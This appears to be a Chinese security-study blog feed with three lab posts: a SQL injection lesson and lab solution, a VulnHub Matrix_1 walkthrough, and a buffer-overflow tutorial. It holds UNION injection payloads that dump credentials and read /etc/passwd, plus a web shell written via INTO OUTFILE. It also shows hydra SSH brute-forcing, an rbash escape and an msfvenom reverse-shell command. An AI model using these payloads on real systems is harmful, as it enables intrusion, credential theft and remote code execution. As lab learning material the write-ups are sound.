INFORMATION_SCHEMA数据库包含有关服务器上存在的数据库和表的元数据。该数据库在利用SQL注入漏洞时发挥着至关重要的作用。由于这是一个不同的数据库，我们不能用SELECT语句直接调用它的表。如果我们只为SELECT语句指定一个表的名称，它将在同一数据库中查找表。 因此，要引用另一个数据库中的表，我们可以使用点“.”操作人员例如，要选择名为my_database的数据库中存在的表用户，我们可以使用：</p><pre><code class="sql">SELECT * FROM my_database.users;</code></pre><h4 id="SCHEMATA"><a href="#SCHEMATA" class="headerlink" title="SCHEMATA"></a><a href="https://dev.mysql.com/doc/refman/8.0/en/information-schema-schemata-table.html">SCHEMATA</a></h4><p>要开始枚举，我们应该找到DBMS上可用的数据库。INFORMATION_SCHEMA数据库中的表SCHETA包含有关服务器上所有数据库的信息。它用于获取数据库名称，以便我们可以查询它们。SCHEMA_NAME列包含当前存在的所有数据库名称。 让我们首先在本地数据库上测试这一点，看看查询是如何使用的：</p><pre><code class="shell-session">mysql&gt; SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;</code></pre><p>在从dev数据库转储数据之前，我们需要获得一个表列表，以便使用SELECT语句查询它们。要查找数据库中的所有表，我们可以使用INFORMATION_SCHEMA数据库中的tables表。 TABLES表包含有关整个数据库中所有表的信息。此表包含多个列，但我们对table_SCHEMA和table_NAME列感兴趣。TABLE_NAME列存储表名，而TABLE_SCHEMA列指向每个表所属的数据库。这可以与我们查找数据库名称的方式类似。例如，我们可以使用以下有效负载来查找dev数据库中的表：</p><pre><code class="sql">cn&#39; UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema=&#39;dev&#39;-- -</code></pre><h2 id="Privileges"><a href="#Privileges" class="headerlink" title="Privileges"></a>Privileges</h2><p>读取数据比写入数据要常见得多，在现代数据库管理系统中，写入数据是严格为特权用户保留的，因为它可能会导致系统利用，正如我们将看到的那样。例如，在MySQL中，DB用户必须具有FILE权限才能将文件的内容加载到表中，然后从该表中转储数据并读取文件。因此，让我们从收集数据库中有关用户权限的数据开始，以决定是否将文件读取和&#x2F;或写入后端服务器。</p><p>首先，我们必须确定数据库中的用户。虽然我们不一定需要数据库管理员（DBA）权限来读取数据，但在现代DBMS中，这一点变得越来越重要，因为只有DBA才能获得这样的权限。这同样适用于其他常见数据库。如果我们确实拥有DBA权限，那么我们更有可能拥有文件读取权限。如果我们不这样做，那么我们必须检查我们的权限，看看我们能做什么。为了能够找到我们当前的DB用户，我们可以使用以下任何查询：</p><pre><code class="sql">SELECT USER()SELECT CURRENT_USER()SELECT user from mysql.user</code></pre><p>既然我们知道了我们的用户，我们就可以开始寻找我们对该用户有什么特权了。首先，我们可以通过以下查询来测试我们是否具有超级管理员权限：</p><pre><code class="sql">SELECT super_priv FROM mysql.user</code></pre><p>查询返回Y，意思是YES，表示超级用户权限。我们还可以通过以下查询直接从模式中转储其他特权：</p><pre><code class="sql">cn&#39; UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -</code></pre><h2 id="LOAD-FILE"><a href="#LOAD-FILE" class="headerlink" title="LOAD_FILE"></a>LOAD_FILE</h2><p>既然我们知道我们有足够的权限读取本地系统文件，那么让我们使用LOAD_FILE（）函数来完成这一操作。LOAD_FILE（）函数可以在MariaDB&#x2F;MMySQL中用于从文件中读取数据。该函数只接受一个参数，即文件名。以下查询是如何读取&#x2F;etc&#x2F;passwd文件的示例：</p><pre><code class="sql">SELECT LOAD_FILE(&#39;/etc/passwd&#39;);</code></pre><p>我们知道当前的页面是search.php。默认的Apache webroot是&#x2F;var&#x2F;www&#x2F;html。让我们试着阅读位于&#x2F;var&#x2F;www&#x2F;html&#x2F;search.php的文件的源代码。</p><p>但是，页面最终会在浏览器中呈现HTML代码。点击[Ctrl+U]可以查看HTML源代码。</p><h1 id="Writing-Files"><a href="#Writing-Files" class="headerlink" title="Writing Files"></a>Writing Files</h1><p>当涉及到将文件写入后端服务器时，它在现代DBMS中变得更加受限，因为我们可以利用它在远程服务器上编写web shell，从而执行代码并接管服务器。这就是为什么现代DBMS默认情况下禁用文件写入，并要求DBA具有某些权限来写入文件。在写入文件之前，我们必须首先检查我们是否有足够的权限，以及DBMS是否允许写入文件。</p><p>为了能够使用MySQL数据库将文件写入后端服务器，我们需要三件事： 启用FILE权限的用户 MySQL全局secure_file_priv变量未启用 对后端服务器上要写入的位置的写入访问权限 我们已经发现，我们的当前用户拥有写入文件所需的FILE权限。我们现在必须检查MySQL数据库是否具有该权限。这可以通过检查secure_file_priv全局变量来完成。</p><h4 id="secure-file-priv"><a href="#secure-file-priv" class="headerlink" title="secure_file_priv"></a><a href="https://mariadb.com/kb/en/server-system-variables/#secure_file_priv">secure_file_priv</a></h4><p>secure_file_priv变量用于确定从何处读取&#x2F;写入文件。空值允许我们从整个文件系统中读取文件。否则，如果设置了某个目录，我们只能从变量指定的文件夹中读取。另一方面，NULL意味着我们不能从任何目录中读取&#x2F;写入。MariaDB默认情况下将此变量设置为空，如果用户具有file权限，则可以读取&#x2F;写入任何文件。但是，MySQL使用&#x2F;var&#x2F;lib&#x2F;MySQL文件作为默认文件夹。这意味着在默认设置下无法通过MySQL注入读取文件。更糟糕的是，一些现代配置默认为NULL，这意味着我们无法在系统中的任何位置读取&#x2F;写入文件。 因此，让我们看看如何找到secure_file_priv的值。在MySQL中，我们可以使用以下查询来获取该变量的值：</p><pre><code class="sql">SHOW VARIABLES LIKE &#39;secure_file_priv&#39;;</code></pre><p>但是，当我们使用UNION注入时，我们必须使用SELECT语句来获取值。这应该不是问题，因为所有变量和大多数配置都存储在INFORMATION_SCHEMA数据库中。MySQL全局变量存储在一个名为global_variables的表中，根据文档，该表有两列variable_name和variable_value。 我们必须从INFORMATION_SCHEMA数据库中的表中选择这两列。MySQL配置中有数百个全局变量，我们不想检索所有这些变量。然后，我们将使用我们在上一节中了解到的WHERE子句来过滤结果，以仅显示secure_file_priv变量。 最终的SQL查询如下：</p><pre><code class="sql">SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name=&quot;secure_file_priv&quot;</code></pre><h2 id="SELECT-INTO-OUTFILE"><a href="#SELECT-INTO-OUTFILE" class="headerlink" title="SELECT INTO OUTFILE"></a><a href="https://mariadb.com/kb/en/select-into-outfile/">SELECT INTO OUTFILE</a></h2><p>既然我们已经确认我们的用户应该将文件写入后端服务器，那么让我们尝试使用SELECT。。INTO OUTFILE语句。SELECT INTO OUTFILE语句可用于将选择查询中的数据写入文件。这通常用于从表中导出数据。 要使用它，我们可以添加INTO OUTFILE“…”在我们的查询之后，将结果导出到我们指定的文件中。以下示例将users表的输出保存到&#x2F;tmp&#x2F;credentials文件中：</p><pre><code class="shell-session">SELECT * from users INTO OUTFILE &#39;/tmp/credentials&#39;;</code></pre><pre><code class="shell-session">Tanin@htb[/htb]$ cat /tmp/credentials 1       admin   392037dbba51f692776d6cefb6dd546d2       newuser 9da2c9bcdf39d8610954e0e11ea8f45f</code></pre><p>还可以直接将字符串选择到文件中，从而允许我们将任意文件写入后端服务器。</p><pre><code class="sql">SELECT &#39;this is a test&#39; INTO OUTFILE &#39;/tmp/test.txt&#39;;</code></pre><pre><code class="shell-session">Tanin@htb[/htb]$ cat /tmp/test.txt this is a test</code></pre><pre><code class="shell-session">Tanin@htb[/htb]$ ls -la /tmp/test.txt -rw-rw-rw- 1 mysql mysql 15 Jul  8 06:20 /tmp/test.txt</code></pre><p>提示：高级文件导出使用’FROM_BASE64（“BASE64_data”）’函数，以便能够写入长&#x2F;高级文件，包括二进制数据。</p><h1 id="practice"><a href="#practice" class="headerlink" title="practice"></a>practice</h1><pre><code>target:138.68.166.146:32658评估web应用程序，并使用各种技术来获得远程代码执行，并在文件系统的/root目录中找到标志。提交标志的内容作为您的答案。</code></pre><p>登录界面可以直接用or绕过，然后应该是使用这个搜索功能：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202306271720631.png" alt="image-20230627172018882"></p><p>用order 命令发现有五个列</p><p><code>&#39; UNION SELECT 1,2,3,4,5 -- - </code></p><p>找到可以回显的位置：2、3、4、5</p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20230627172256079.png" alt="image-20230627172256079"></p><p>然后搜集一下基本信息：</p><p>‘ UNION SELECT 1,2,3,4,5 – - </p><p>database:ilfreight</p><p>version:10.3.22-MariaDB-1ubuntu1</p><p>查询数据库名：</p><p><code>&#39; UNION SELECT 1,SCHEMA_NAME,3,4,5 FROM INFORMATION_SCHEMA.SCHEMATA-- -</code></p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202306271727250.png" alt="image-20230627172731638"></p><p>ilfreight中的表名：</p><p><code>&#39; UNION select 1,2,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema=&#39;ilfreight&#39;-- -</code></p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202306271731778.png" alt="image-20230627173106224"></p><p>查看users表中的列名：</p><p><code>&#39; UNION select 0,1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name=&#39;users&#39;-- - </code></p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202306271732559.png" alt="image-20230627173243903"></p><p>查看具体数据：</p><p><code>&#39; UNION select 0,1, username, password, 4 from ilfreight.users-- -</code></p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202306271735264.png" alt="image-20230627173507427"></p><p>但是发现这居然不是flag….</p><p>可能要读写一下文件：</p><p>看下用户：</p><p><code>&#39; UNION SELECT 1, user(), 3, 4，5-- -</code><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202306271739191.png" alt="image-20230627173936462"></p><p>看看权限：</p><p><code>&#39; UNION SELECT 0,1, super_priv, 3, 4 FROM mysql.user WHERE user=&quot;root&quot;-- -</code></p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202306271737117.png" alt="image-20230627173753181"></p><p>有超级权限，ok,看看能写入的文档：</p><p><code>&#39; UNION SELECT 0,1, VARIABLE_NAME, VARIABLE_VALUE, 4 FROM INFORMATION_SCHEMA.GLOBAL_VARIABLES WHERE VARIABLE_NAME=&quot;SECURE_FILE_PRIV&quot;-- -</code></p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202306271748037.png" alt="image-20230627174758369"></p><p>返回空值，hh，开搞</p><p><code>&#39; UNION SELECT &quot;&quot;,&quot;&quot;,&#39;&lt;?PHP SYSTEM($_REQUEST[0]); ?&gt;&#39;, &quot;&quot;, &quot;&quot; INTO OUTFILE &#39;/VAR/WWW/HTML/DASHBOARD/SHELL.PHP&#39;-- -</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> base </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Penetration-Matrix_1</title>
      <link href="/2023/06/25/Penetration-ggg/"/>
      <url>/2023/06/25/Penetration-ggg/</url>
      
        <content type="html"><![CDATA[<p>Penetration-Matrix_1 打靶记录</p><span id="more"></span><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20230625152327098.png" alt="image-20230625152327098"></p><p>确认靶机地址为192.168.91.134</p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20230625152629574.png" alt="image-20230625152629574"></p><p>看看这两个主页先</p><p>在31337端口源码中发现一串base64加密后的代码</p><pre><code>&lt;div class=&quot;service&quot;&gt;                                    &lt;!--p class=&quot;service__text&quot;&gt;ZWNobyAiVGhlbiB5b3UnbGwgc2VlLCB0aGF0IGl0IGlzIG5vdCB0aGUgc3Bvb24gdGhhdCBiZW5kcywgaXQgaXMgb25seSB5b3Vyc2VsZi4gIiA+IEN5cGhlci5tYXRyaXg=&lt;/p--&gt;                                &lt;/div&gt;&lt;!-- End / service --&gt;</code></pre><p>解码一下看看：</p><pre><code>echo ZWNobyAiVGhlbiB5b3UnbGwgc2VlLCB0aGF0IGl0IGlzIG5vdCB0aGUgc3Bvb24gdGhhdCBiZW5kcywgaXQgaXMgb25seSB5b3Vyc2VsZi4gIiA+IEN5cGhlci5tYXRyaXg= | base64 -decho &quot;Then you&#39;ll see, that it is not the spoon that bends, it is only yourself. &quot; &gt; Cypher.matrix      </code></pre><p>Cypher.matrix   ?  他把这句话输入了这个文件，看看能不能打开这个文件</p><p>打开是这样的：</p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20230625154131404.png" alt="image-20230625154131404"></p><p>这应该是代码混淆后的内容，解码一下：</p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20230625154819519.png" alt="image-20230625154819519"></p><p>这人好离谱，无语子。。</p><p>扫描一下目录看看有没有什么信息：</p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20230625153422509.png" alt="image-20230625153422509"></p><p>东西很少，上去看了一下没啥能用的，只发现了一个.gitkeep文件：</p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20230625153516226.png" alt="image-20230625153516226"></p><p>扫扫另一个：</p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20230625153625021.png" alt="image-20230625153625021"></p><p>没啥区别</p><p>看来只能爆破一下这个密码先了：</p><p>先生成一个字典：</p><p><code>crunch 8 8 -f /usr/share/crunch/charset.lst lalpha-numeric -t k1ll0r@@ &gt; pass.dic</code></p><p>爆破一下：</p><p><code>hydra -l guest -P pass.dic ssh://192.168.91.134 -f -vV -o hydra.ssh</code></p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20230625161441522.png" alt="image-20230625161441522"></p><p>得到密码：<code>k1ll0r7n</code></p><p>登录到主机后发现在rbash模式</p><h4 id="rbash"><a href="#rbash" class="headerlink" title="rbash"></a>rbash</h4><pre><code>`rbash`（restricted bash）是一种限制性的 Unix shell，它是 Bash shell 的一种变体。`rbash` 提供了一种受限的环境，用于限制用户在系统上执行的操作和访问的资源。当用户被配置为使用 `rbash` 作为其默认 shell 时，它会强制执行一些安全限制，包括以下内容：1. 限制命令搜索路径：`rbash` 会忽略用户的 `PATH` 环境变量，只使用内部定义的路径来搜索可执行命令。这样可以防止用户执行系统上的某些命令。2. 禁用命令别名：`rbash` 不允许用户定义自己的命令别名。3. 禁用 Shell 函数：`rbash` 禁止用户定义和执行自己的 Shell 函数。4. 限制修改 Shell 变量：`rbash` 限制用户对特定 Shell 变量进行修改，例如 `SHELLOPTS`、`BASH_ENV`、`ENV` 等。这样可以防止用户通过修改这些变量来绕过限制。5. 禁用 `cd` 到斜杠：`rbash` 禁止用户使用 `cd` 命令切换到根目录 (`/`)。通过应用这些限制，`rbash` 提供了一种更加安全和受控的 Shell 环境，适用于那些需要限制用户访问权限和操作能力的场景，例如共享计算机、受限账户等。要将用户配置为使用 `rbash`，可以将其登录 shell 更改为 `/bin/rbash`，或者通过修改用户的 `/etc/passwd` 文件中的 shell 配置来实现。</code></pre><p><a href="https://blog.csdn.net/qq_43168364/article/details/111830233">(146条消息) 【渗透测试】— rbash逃逸方法简述_rbash 命令_通地塔的博客-CSDN博客</a></p><p>这里vi命令可以使用，在末行模式下输入<code>:!/bin/bash</code>进入bash</p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20230625160702938.png" alt="image-20230625160702938"></p><p>但是还有一些命令无法使用</p><hr><p>这里查一下gpt：</p><p>如果在 Bash shell 中执行 <code>id</code> 命令时出现 “bash: id: command not found” 错误，这可能是由于系统的环境变量配置问题导致 Bash 无法找到 <code>id</code> 命令。</p><p><code>id</code> 命令通常位于 <code>/usr/bin</code> 目录下，这个目录通常包含在系统的 <code>PATH</code> 环境变量中。<code>PATH</code> 环境变量定义了用于查找可执行文件的路径列表。</p><p>以下是一些可能导致 <code>id</code> 命令无法被找到的原因和解决方法：</p><ol><li><p>检查 <code>PATH</code> 环境变量：运行 <code>echo $PATH</code> 命令来查看当前的 <code>PATH</code> 环境变量设置。确保 <code>/usr/bin</code> 或包含 <code>id</code> 命令的路径被正确地包含在 <code>PATH</code> 中。如果缺少 <code>/usr/bin</code>，你可以使用 <code>export</code> 命令来添加它：</p><pre><code>export PATH=$PATH:/usr/bin</code></pre></li><li><p>检查命令是否存在：确认 <code>/usr/bin</code> 目录中是否存在 <code>id</code> 命令。你可以运行 <code>ls /usr/bin/id</code> 来验证它是否存在。如果不存在，可能是由于系统配置或软件包问题导致命令缺失。</p></li><li><p>检查文件权限：确保 <code>/usr/bin/id</code> 文件的权限设置正确，使其可执行。你可以运行 <code>ls -l /usr/bin/id</code> 命令来查看文件的权限设置。如果权限不正确，可以使用 <code>chmod</code> 命令进行更改：</p><pre><code>sudo chmod +x /usr/bin/id</code></pre></li><li><p>系统路径配置问题：如果你的系统存在其他路径配置问题，可能需要对系统的环境进行进一步检查和修复。这可能涉及到检查 <code>/etc/profile</code>、<code>~/.bash_profile</code>、<code>~/.bashrc</code> 等文件中的配置，以确保正确设置了 <code>PATH</code> 环境变量。</p></li></ol><p>如果以上方法仍然无法解决问题，可能需要进一步检查系统配置或与系统管理员联系以获取支持。</p><hr><p>ok,设置一下环境变量：</p><p><code>export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</code></p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20230625161454791.png" alt="image-20230625161454791"></p><p>现在可以直接用密码进入root用户，但是我们看到&#x2F;bin&#x2F;cp是有sudo权限的，学习一下怎么提权：</p><p>[(146条消息) Linux提权之SUID提权_安全<del>小菜鸡的博客-CSDN博客](<a href="https://blog.csdn.net/weixin_51692662/article/details/126464004#">https://blog.csdn.net/weixin_51692662/article/details/126464004#</a>:</del>:text&#x3D;根据上面的话理解，那么我们理解cp在有suid权限使用时具有root权限，那我们可以用此命令 提权,，大致步骤查看cp有没有suid权限——&gt;将 %2Fetc%2Fpasswd文件cp到本目录——&gt;使用命令生成新的root用户和密码——&gt;vim添加此用户并wq！ 强制保存——&gt;将本目录cp到%2Fetc%2Fpasswd。)</p><p>后来发现没有权限，g</p>]]></content>
      
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Buffer-Overflows-part-2</title>
      <link href="/2023/06/25/Buffer-Overflows-part-2/"/>
      <url>/2023/06/25/Buffer-Overflows-part-2/</url>
      
        <content type="html"><![CDATA[<h1 id="Take-Control-of-EIP"><a href="#Take-Control-of-EIP" class="headerlink" title="Take Control of EIP"></a>Take Control of EIP</h1><p>基于堆栈的缓冲区溢出最重要的一个方面是控制指令指针（EIP），这样我们就可以告诉它应该跳转到哪个地址。这将使EIP指向shell代码开始的地址，并使CPU执行它。 我们可以使用Python在GDB中执行命令，Python直接作为输入。</p><span id="more"></span><h4 id="Segmentation-Fault"><a href="#Segmentation-Fault" class="headerlink" title="Segmentation Fault"></a>Segmentation Fault</h4><pre><code class="shell-session">student@nix-bow:~$ gdb -q bow32(gdb) run $(python -c &quot;print &#39;\x55&#39; * 1200&quot;)Starting program: /home/student/bow/bow32 $(python -c &quot;print &#39;\x55&#39; * 1200&quot;)Program received signal SIGSEGV, Segmentation fault.0x55555555 in ?? ()</code></pre><p>如果我们插入1200“U”（十六进制“55”）作为输入，我们可以从寄存器信息中看到我们已经覆盖了EIP。据我们所知，EIP指向下一个要执行的指令。</p><pre><code class="shell-session">(gdb) info registers eax            0x11ecx            0xffffd6c0-10560edx            0xffffd06f-12177ebx            0x555555551431655765esp            0xffffcfd00xffffcfd0ebp            0x555555550x55555555# &lt;---- EBP overwrittenesi            0xf7fb5000-134524928edi            0x00eip            0x555555550x55555555# &lt;---- EIP overwritteneflags         0x10286[ PF SF IF RF ]cs             0x2335ss             0x2b43ds             0x2b43es             0x2b43fs             0x00gs             0x6399</code></pre><p>如果我们想直观地想象这个过程，那么这个过程看起来是这样的。</p><h4 id="Buffer"><a href="#Buffer" class="headerlink" title="Buffer"></a>Buffer</h4><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202306251053659.png" alt="image"></p><p>这意味着我们必须写入对EIP的访问权限。这反过来又允许指定EIP应该跳转到哪个内存地址。然而，为了操作寄存器，我们需要一个精确数量的U，直到EIP，这样下面的4个字节就可以用我们想要的内存地址覆盖。</p><h2 id="Determine-The-Offset"><a href="#Determine-The-Offset" class="headerlink" title="Determine The Offset"></a>Determine The Offset</h2><p>偏移量用于确定覆盖缓冲区需要多少字节，以及外壳代码周围有多少空间。 Shellcode是一种程序代码，其中包含我们希望CPU执行的操作的指令。shell代码的手动创建将在其他模块中进行更详细的讨论。但为了节省一些时间，我们首先使用Metasploit框架（MSF），它提供了一个名为“pattern_create”的Ruby脚本，可以帮助我们确定到达EIP的确切字节数。它根据指定的字节长度创建一个唯一的字符串，以帮助确定偏移量。</p><h4 id="Create-Pattern"><a href="#Create-Pattern" class="headerlink" title="Create Pattern"></a>Create Pattern</h4><pre><code class="shell-session">Tanin@htb[/htb]$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1200 &gt; pattern.txtTanin@htb[/htb]$ cat pattern.txtAa0Aa1Aa2Aa3Aa4Aa5...&lt;SNIP&gt;...Bn6Bn7Bn8Bn9</code></pre><p>现在，我们用生成的模式替换我们的1200个“U”，并再次将注意力集中在EIP上。</p><h4 id="GDB-Using-Generated-Pattern"><a href="#GDB-Using-Generated-Pattern" class="headerlink" title="GDB - Using Generated Pattern"></a>GDB - Using Generated Pattern</h4><pre><code class="shell-session">(gdb) run $(python -c &quot;print &#39;Aa0Aa1Aa2Aa3Aa4Aa5...&lt;SNIP&gt;...Bn6Bn7Bn8Bn9&#39;&quot;) The program being debugged has been started already.Start it from the beginning? (y or n) yStarting program: /home/student/bow/bow32 $(python -c &quot;print &#39;Aa0Aa1Aa2Aa3Aa4Aa5...&lt;SNIP&gt;...Bn6Bn7Bn8Bn9&#39;&quot;)Program received signal SIGSEGV, Segmentation fault.0x69423569 in ?? ()</code></pre><h4 id="GDB-EIP"><a href="#GDB-EIP" class="headerlink" title="GDB - EIP"></a>GDB - EIP</h4><pre><code class="shell-session">(gdb) info registers eipeip            0x694235690x69423569</code></pre><p>我们看到EIP显示了一个不同的内存地址，我们可以使用另一个名为“pattern_offset”的MSF工具来计算前进到EIP所需的确切字符数（偏移量）。</p><h4 id="GDB-Offset"><a href="#GDB-Offset" class="headerlink" title="GDB - Offset"></a>GDB - Offset</h4><pre><code class="shell-session">Tanin@htb[/htb]$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x69423569[*] Exact match at offset 1036</code></pre><h4 id="Buffer-1"><a href="#Buffer-1" class="headerlink" title="Buffer"></a>Buffer</h4><p><img src="https://academy.hackthebox.com/storage/modules/31/buffer_overflow_3.png" alt="image"></p><p>如果我们现在将这个字节数精确地用于我们的“U”，那么我们应该正好落在EIP上。要覆盖它并检查我们是否按计划到达它，我们可以用“\x66”再添加4个字节并执行它，以确保我们控制EIP。</p><h4 id="GDB-Offset-1"><a href="#GDB-Offset-1" class="headerlink" title="GDB Offset"></a>GDB Offset</h4><pre><code class="shell-session">(gdb) run $(python -c &quot;print &#39;\x55&#39; * 1036 + &#39;\x66&#39; * 4&quot;)The program being debugged has been started already.Start it from the beginning? (y or n) yStarting program: /home/student/bow/bow32 $(python -c &quot;print &#39;\x55&#39; * 1036 + &#39;\x66&#39; * 4&quot;)Program received signal SIGSEGV, Segmentation fault.0x66666666 in ?? ()</code></pre><h4 id="Buffer-2"><a href="#Buffer-2" class="headerlink" title="Buffer"></a>Buffer</h4><p><img src="https://academy.hackthebox.com/storage/modules/31/buffer_overflow_4.png" alt="image"></p><p>现在我们看到我们已经用“\x66”字符覆盖了EIP。接下来，我们必须找出我们的shell代码有多少空间，然后shell代码执行我们想要的命令。当我们现在控制EIP时，我们稍后将用指向shell代码开头的地址覆盖它。</p><h4 id="practice"><a href="#practice" class="headerlink" title="practice"></a>practice</h4><pre><code>target:10.129.42.190检查寄存器并提交EBP地址作为答案。</code></pre><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20230625210417868.png" alt="image-20230625210417868"></p><h1 id="Determine-the-Length-for-Shellcode"><a href="#Determine-the-Length-for-Shellcode" class="headerlink" title="Determine the Length for Shellcode"></a>Determine the Length for Shellcode</h1><p>现在，我们应该知道我们有多少空间让shell代码执行我们想要的操作。利用这样的漏洞获得反向shell对我们来说是一种潮流和有用的做法。首先，我们必须大致了解我们将插入的shell代码有多大，为此，我们将使用msfvenom。</p><pre><code class="shell-session">Tanin@htb[/htb]$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 lport=31337 --platform linux --arch x86 --format cNo encoder or badchars specified, outputting raw payloadPayload size: 68 bytes&lt;SNIP&gt;</code></pre><p>我们现在知道我们的有效载荷大约是68字节。作为预防措施，如果由于后来的规范导致外shell码增加，我们应该尝试采用更大的范围。 通常，在shell代码开始之前插入一些无操作指令（NOPS）会很有用，这样它就可以干净地执行。让我们简要总结一下我们需要做些什么：</p><ul><li>我们总共需要1040个字节才能到达EIP。</li><li>在这里，我们可以使用额外的100字节NOP </li><li>150字节用于我们的外壳代码。</li></ul><pre><code class="shell-session">   Buffer = &quot;\x55&quot; * (1040 - 100 - 150 - 4) = 786     NOPs = &quot;\x90&quot; * 100Shellcode = &quot;\x44&quot; * 150      EIP = &quot;\x66&quot; * 4&#39;</code></pre><h4 id="Buffer-3"><a href="#Buffer-3" class="headerlink" title="Buffer"></a>Buffer</h4><p><img src="https://academy.hackthebox.com/storage/modules/31/buffer_overflow_8.png" alt="image"></p><p>现在我们可以试着找出我们有多少可用空间来插入外壳代码。</p><pre><code class="shell-session">(gdb) run $(python -c &#39;print &quot;\x55&quot; * (1040 - 100 - 150 - 4) + &quot;\x90&quot; * 100 + &quot;\x44&quot; * 150 + &quot;\x66&quot; * 4&#39;)The program being debugged has been started already.Start it from the beginning? (y or n) yStarting program: /home/student/bow/bow32 $(python -c &#39;print &quot;\x55&quot; * (1040 - 100 - 150 - 4) + &quot;\x90&quot; * 100 + &quot;\x44&quot; * 150 + &quot;\x66&quot; * 4&#39;)Program received signal SIGSEGV, Segmentation fault.0x66666666 in ?? ()</code></pre><h4 id="Buffer-4"><a href="#Buffer-4" class="headerlink" title="Buffer"></a>Buffer</h4><p><img src="https://academy.hackthebox.com/storage/modules/31/buffer_overflow_7.png" alt="image"></p><h4 id="practice-1"><a href="#practice-1" class="headerlink" title="practice"></a>practice</h4><pre><code>target:如果我们把NOPS和shell代码大小计算在一起，我们的shell代码理论上能变成多大？（格式：00字节）</code></pre><h1 id="Identification-of-Bad-Characters"><a href="#Identification-of-Bad-Characters" class="headerlink" title="Identification of Bad Characters"></a>Identification of Bad Characters</h1><p>以前在类UNIX操作系统中，二进制文件以两个字节开头，其中包含一个决定文件类型的“幻数”。一开始，这是用来识别不同平台的对象文件的。渐渐地，这个概念被转移到了其他文件中，现在几乎每个文件都包含一个神奇的数字。 这样的保留字符也存在于应用程序中，但它们并不总是出现，也不总是相同的。这些保留字符，也被称为坏字符，可能会有所不同，但我们经常会看到这样的字符：</p><ul><li><code>\x00</code> - Null Byte</li><li><code>\x0A</code> - Line Feed</li><li><code>\x0D</code> - Carriage Return</li><li><code>\xFF</code> - Form Feed</li></ul><p>在这里，我们使用以下字符列表来找出生成外壳代码时必须考虑和避免的所有字符。</p><pre><code class="shell-session">Tanin@htb[/htb]$ CHARS=&quot;\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;</code></pre><p>为了计算CHARS变量中的字节数，我们可以使用bash，将“\x”替换为空格，然后使用wc对单词进行计数。</p><h4 id="Calculate-CHARS-Length"><a href="#Calculate-CHARS-Length" class="headerlink" title="Calculate CHARS Length"></a>Calculate CHARS Length</h4><pre><code class="shell-session">Tanin@htb[/htb]$ echo $CHARS | sed &#39;s/\\x/ /g&#39; | wc 